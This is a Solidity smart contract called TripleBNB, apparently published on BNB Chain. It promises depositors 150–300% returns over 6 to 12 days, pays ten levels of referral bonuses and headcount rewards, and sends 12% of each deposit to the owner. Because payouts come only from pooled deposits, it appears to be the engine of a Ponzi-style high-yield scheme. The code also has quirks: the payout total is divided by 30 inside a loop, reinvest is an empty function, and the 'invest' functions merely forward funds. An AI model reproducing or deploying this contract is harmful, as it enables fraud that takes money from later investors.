/**
 *Submitted for verification at BscScan.com on 2022-04-30
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0;

struct Tarif {
  uint8 life_days;
  uint256 percent;
}
struct Deposit {
  uint8 tarif;
  uint256 amount;
  uint40 time;
}

struct Player {
  address upline;
  uint256 dividends;
  uint256 match_bonus;
  uint256 reward_bonus;
  uint40 last_payout;
  uint256 total_invested;
  uint256 total_withdrawn;
  uint256 total_match_bonus;
  Deposit[] deposits;
  uint256[10] structure;
  mapping(uint16 => bool) Isreward;
}

contract TripleBNB {
    address public owner;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    
    uint8 constant BONUS_LINES_COUNT = 10;
    uint8 constant LevelBusiness_LINES_COUNT = 10;
    uint16 constant PERCENT_DIVIDER = 1000; 
    uint8[BONUS_LINES_COUNT] public ref_bonuses = [70, 50, 30, 20, 10, 10, 10, 10, 10, 10];

     uint32[10] public Heads_Required_On_Level = [1500, 9000, 18000, 40000, 75000, 125000, 250000, 500000, 750000, 1000000];
    //uint32[10] public Heads_Required_On_Level = [2, 1, 1, 1, 1, 1, 1, 1, 1, 1];  // test data
    uint32[10] public reward = [2, 4, 8, 12, 20, 40, 80, 120, 160, 250];
    //uint32[10] public reward = [1, 1, 1, 1, 1, 1, 1, 1, 1, 1]; //test data

    mapping(uint8 => Tarif) public tarifs;
    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor() {
        owner = msg.sender;

        uint256 tarifPercent = 150;
        for (uint8 tarifDuration = 6; tarifDuration <= 12; tarifDuration++) {
            tarifs[tarifDuration] = Tarif(tarifDuration, tarifPercent);
            tarifPercent+= 25;
        }
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != owner) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }

            players[_addr].upline = _upline;

          

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < LevelBusiness_LINES_COUNT; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= 0.05 ether, "Minimum deposit amount is 0.05 BNB");

        Player storage player = players[msg.sender];

        require(player.deposits.length < 100, "Max 100 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);


        // I know the amount on level as well as the Heads on level

        for(uint16 i = 0; i < Heads_Required_On_Level.length; i++) {

            uint256 Heads = players[_upline].structure[i];
            uint256 Required_heads =  Heads_Required_On_Level[i];
            
            
            if(Heads >= Required_heads )
            {
                // Eligible for the reward
                if(players[_upline].Isreward[i] == false)
                {
                    players[_upline].Isreward[i] = true;
                    players[_upline].reward_bonus += reward[i] * 10 ** 18;
                }
                   
            }

             _upline = players[_upline].upline;

            if(_upline == address(0)) break;


        }
    



        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);

        payable(owner).transfer(msg.value * 12  / 100);
        
        emit NewDeposit(msg.sender, msg.value, _tarif);
    }
    
    function withdraw() external {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.match_bonus > 0 || player.reward_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.match_bonus + player.reward_bonus;

        require(amount >= 0.12 ether, "Minimum Withdraw amount is 0.12 BNB");

        player.dividends = 0;
        player.match_bonus = 0;
        player.reward_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        payable(msg.sender).transfer(amount);
        
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
                value = value / 30;
            }
        }

        return value;
    }


    
    function userInfo(address _addr) view external returns(uint256 avail_bonus,uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[LevelBusiness_LINES_COUNT] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < LevelBusiness_LINES_COUNT; i++) {
            structure[i] = player.structure[i];
        }

        return (
            player.reward_bonus,
            payout + player.dividends + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure
        );
    }

    function rewardInfo(address _addr, uint16 index) view external returns(bool rewardbool) {
        Player storage player = players[_addr];
        return player.Isreward[index];
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus) {
        return (invested, withdrawn, match_bonus);
    }

    function reinvest() external {
      
    }

    function invest() external payable {
      payable(msg.sender).transfer(msg.value);
    }

    function invest(address to) external payable {
      payable(to).transfer(msg.value);
    }

}